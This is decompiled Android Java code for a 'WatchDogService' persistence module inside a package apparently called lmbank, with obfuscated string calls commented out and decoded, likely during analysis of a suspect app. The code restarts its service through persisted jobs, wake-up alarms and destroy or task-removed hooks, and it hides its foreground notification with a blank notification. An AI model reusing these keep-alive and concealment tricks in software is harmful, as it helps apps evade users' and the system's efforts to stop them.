package com.wish.lmbank.hellodaemon;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;

import java.util.concurrent.TimeUnit;

import gv00l3ah.mvdt7w.bb7d7pu7;
import io.reactivex.Flowable;
import io.reactivex.disposables.Disposable;
import io.reactivex.functions.Consumer;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/hellodaemon/WatchDogService.class */
public class WatchDogService extends Service {
    protected static final int HASH_CODE = 2;
    protected static Disposable sDisposable;
    protected static PendingIntent sPendingIntent;

    @SuppressLint("MissingPermission")
    protected final int onStart(Intent intent, int i, int i2) {
        if (DaemonEnv.sInitialized) {
            Disposable disposable = sDisposable;
            if (disposable == null || disposable.isDisposed()) {
                if (Build.VERSION.SDK_INT <= 24) {
                    startForeground(2, new Notification());
                    if (Build.VERSION.SDK_INT >= 18) {
                        try {
                            startService(new Intent(DaemonEnv.sApp, WatchDogNotificationServiceV.class));
                        } catch (Exception e) {
                        }
                    }
                }
                if (Build.VERSION.SDK_INT >= 21) {
                    JobInfo.Builder builder = new JobInfo.Builder(2, new ComponentName(DaemonEnv.sApp, JobSchedulerService.class));
                    builder.setPeriodic(DaemonEnv.getWakeUpInterval());
                    if (Build.VERSION.SDK_INT >= 24) {
                        builder.setPeriodic(JobInfo.getMinPeriodMillis(), JobInfo.getMinFlexMillis());
                    }
                    builder.setPersisted(true);
//                         ((JobScheduler) getSystemService(bb7d7pu7.m5998("AwYLGgoBDA0cBQwb"))).schedule(builder.build());
                    ((JobScheduler) getSystemService("jobscheduler")).schedule(builder.build());
                } else {
//                         AlarmManager alarmManager = (AlarmManager) getSystemService(bb7d7pu7.m5998("CAUIGwQ"));
                    AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
                    sPendingIntent = PendingIntent.getService(DaemonEnv.sApp, 2, new Intent(DaemonEnv.sApp, DaemonEnv.sServiceClass), PendingIntent.FLAG_UPDATE_CURRENT);
                    alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + DaemonEnv.getWakeUpInterval(), DaemonEnv.getWakeUpInterval(), sPendingIntent);
                }
                sDisposable = Flowable.interval(DaemonEnv.getWakeUpInterval(), TimeUnit.MILLISECONDS).subscribe(new Consumer<Long>() { // from class: com.wish.lmbank.hellodaemon.WatchDogService.1

                    @Override // io.reactivex.functions.Consumer
                    public void accept(Long l) throws Exception {
                        WatchDogService.this.startService(new Intent(DaemonEnv.sApp, DaemonEnv.sServiceClass));
                    }
                }, new Consumer<Throwable>() { // from class: com.wish.lmbank.hellodaemon.WatchDogService.2

                    @Override // io.reactivex.functions.Consumer
                    public void accept(Throwable th) throws Exception {
                        th.printStackTrace();
                    }
                });
//                    getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), DaemonEnv.sServiceClass.getName()), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                return 1;
            }
            return 1;
        }
        return 1;
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        return onStart(intent, i, i2);
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        onStart(intent, 0, 0);
        return null;
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:14:0x004f -> B:20:0x003b). Please submit an issue!!! */
    protected void onEnd(Intent intent) {
        if (DaemonEnv.sInitialized) {
            try {
                startService(new Intent(DaemonEnv.sApp, DaemonEnv.sServiceClass));
            } catch (Exception e) {
            }
            try {
                startService(new Intent(DaemonEnv.sApp, WatchDogService.class));
                return;
            } catch (Exception e2) {
                return;
            }
        }
        return;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        onEnd(intent);
    }

    @Override // android.app.Service
    public void onDestroy() {
        onEnd(null);
    }

    public static void cancelJobAlarmSub() {
        if (DaemonEnv.sInitialized) {
            if (Build.VERSION.SDK_INT >= 21) {
//                 ((JobScheduler) DaemonEnv.sApp.getSystemService(bb7d7pu7.m5998("AwYLGgoBDA0cBQwb"))).cancel(2);
                ((JobScheduler) DaemonEnv.sApp.getSystemService(Context.JOB_SCHEDULER_SERVICE)).cancel(2);
            } else {
//                 AlarmManager alarmManager = (AlarmManager) DaemonEnv.sApp.getSystemService(bb7d7pu7.m5998("CAUIGwQ"));
                AlarmManager alarmManager = (AlarmManager) DaemonEnv.sApp.getSystemService("alarm");
                PendingIntent pendingIntent = sPendingIntent;
                if (pendingIntent != null) {
                    alarmManager.cancel(pendingIntent);
                }
            }
            Disposable disposable = sDisposable;
            if (disposable != null) {
                disposable.dispose();
            }
        }
    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/hellodaemon/WatchDogService$WatchDogNotificationServiceV.class */
    public static class WatchDogNotificationServiceV extends Service {
        @Override // android.app.Service
        public IBinder onBind(Intent intent) {
            return null;
        }

        @Override // android.app.Service
        public int onStartCommand(Intent intent, int i, int i2) {
            startForeground(2, new Notification());
            stopSelf();
            return Service.START_STICKY;
        }
    }
}
